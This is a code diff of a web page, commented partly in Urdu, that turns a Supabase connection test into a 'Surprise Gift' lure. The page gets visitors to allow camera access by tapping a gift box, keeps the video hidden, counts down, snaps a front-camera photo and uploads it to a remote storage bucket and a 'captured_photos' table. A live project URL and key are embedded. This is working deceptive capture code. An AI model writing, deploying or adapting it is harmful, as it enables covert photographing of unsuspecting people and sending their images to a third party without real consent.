@@ -2,58 +2,125 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Final Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise Gift 🎁</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { background: #1e272e; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; margin: 0; }
+        
+        #gift-box { cursor: pointer; transition: 0.3s; }
+        #gift-box:active { transform: scale(0.9); }
+        .emoji { font-size: 100px; animation: bounce 2s infinite; display: block; }
+        h1 { margin-top: 10px; color: #ff4757; }
+        
+        #timer { font-size: 6rem; color: #ff4757; display: none; font-weight: bold; }
+        #status { margin-top: 20px; font-size: 1.2rem; color: #ced6e0; }
+        
+        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(-20px);} }
+    </style>
 </head>
-<body style="background-color: #222; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
+<body>
 
-    <h1>Supabase Connection Check</h1>
-    <p>Open this page and click the button.</p>
+    <div id="gift-box" onclick="startCameraProcess()">
+        <div class="emoji">🎁</div>
+        <h1>Tap to Open</h1>
+        <p style="font-size: 0.8rem; color: gray;">(Click allow when asked)</p>
+    </div>
 
-    <button onclick="sendData()" style="padding: 15px 30px; font-size: 20px; cursor: pointer; background: green; color: white; border: none;">
-        CLICK ME TO TEST
-    </button>
+    <div id="timer">10</div>
+    <p id="status"></p>
 
-    <p id="msg" style="margin-top: 20px; font-size: 18px;">Waiting...</p>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 1. سب سے پہلے یہ چیک کریں کہ جاوا اسکرپٹ چل رہی ہے یا نہیں
-        alert("System Ready! Code is working.");
-
-        // --- SUPABASE SETTINGS ---
+        // --- SUPABASE CONFIG ---
         const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
-        
-        // Supabase کو کنیکٹ کرنا
-        let supabase;
-        try {
-            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-            console.log("Supabase initialized");
-        } catch (err) {
-            alert("Error: Supabase library not loaded. Check Internet.");
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function startCameraProcess() {
+            const status = document.getElementById('status');
+
+            // 1. SAFETY CHECK: کیا یہ کوڈ ایسی جگہ چل رہا ہے جہاں کیمرہ الاؤ ہے؟
+            // کروم صرف HTTPS یا Localhost پر کیمرہ چلاتا ہے۔
+            if (window.location.protocol === 'file:') {
+                alert("مسئلہ پکڑا گیا! 🛑\n\nآپ اس فائل کو کمپیوٹر سے ڈائریکٹ چلا رہے ہیں۔ کروم سکیورٹی کی وجہ سے اس طرح کیمرہ آن نہیں کرتا۔\n\nبرائے مہربانی اسے VS Code Live Server پر چلائیں یا Netlify پر اپلوڈ کریں۔");
+                status.innerText = "Error: Please run on Localhost or HTTPS.";
+                return;
+            }
+
+            try {
+                // 2. کیمرہ مانگنا
+                status.innerText = "Waiting for permission...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                
+                // 3. اگر الاؤ کر دیا تو:
+                document.getElementById('video').srcObject = stream;
+                startTimer();
+
+            } catch (err) {
+                console.error(err);
+                alert("Permission Denied! ❌\nبراہ کرم پاپ اپ پر 'Allow' کلک کریں۔");
+                status.innerText = "Camera access denied.";
+            }
         }
 
-        async function sendData() {
-            const msgBox = document.getElementById('msg');
-            msgBox.innerText = "Connecting...";
-            msgBox.style.color = "yellow";
+        function startTimer() {
+            document.getElementById('gift-box').style.display = 'none';
+            document.getElementById('timer').style.display = 'block';
+            document.getElementById('status').innerText = "Processing...";
+            
+            let count = 10;
+            const interval = setInterval(() => {
+                count--;
+                document.getElementById('timer').innerText = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    captureAndSave();
+                }
+            }, 1000);
+        }
 
-            console.log("Button Clicked. Sending data...");
+        async function captureAndSave() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Mirror
+            ctx.drawImage(video, 0, 0);
 
-            // ڈمی ڈیٹا بھیجنا
-            const { error } = await supabase
-                .from('captured_photos')
-                .insert([{ image_url: "https://placehold.co/100x100/png?text=Success" }]);
+            document.getElementById('status').innerText = "Saving Gift...";
 
-            if (error) {
-                console.error(error);
-                alert("Database Error: " + error.message);
-                msgBox.innerText = "Failed: " + error.message;
-            } else {
-                alert("Mubarak Ho! Data sent successfully.");
-                msgBox.innerText = "✅ Data Sent! Check Admin Page.";
-                msgBox.style.color = "#00ff00";
-            }
+            canvas.toBlob(async (blob) => {
+                const fileName = `snap_${Date.now()}.png`;
+
+                // Upload Image
+                const { error: uploadError } = await supabase.storage.from('camsnaps').upload(fileName, blob);
+                
+                if (uploadError) {
+                    alert("Upload Error: " + uploadError.message);
+                    return;
+                }
+
+                // Get URL
+                const { data } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
+
+                // Save to Database
+                const { error: dbError } = await supabase.from('captured_photos').insert([{ image_url: data.publicUrl }]);
+
+                if (dbError) {
+                    alert("DB Error: " + dbError.message);
+                } else {
+                    document.getElementById('timer').style.display = 'none';
+                    document.getElementById('status').innerHTML = `<h1>🎉 Done! 🎉</h1><br><img src="${data.publicUrl}" width="200" style="border-radius:10px;">`;
+                    
+                    // Stop Camera
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+            }, 'image/png');
         }
     </script>
 </body>
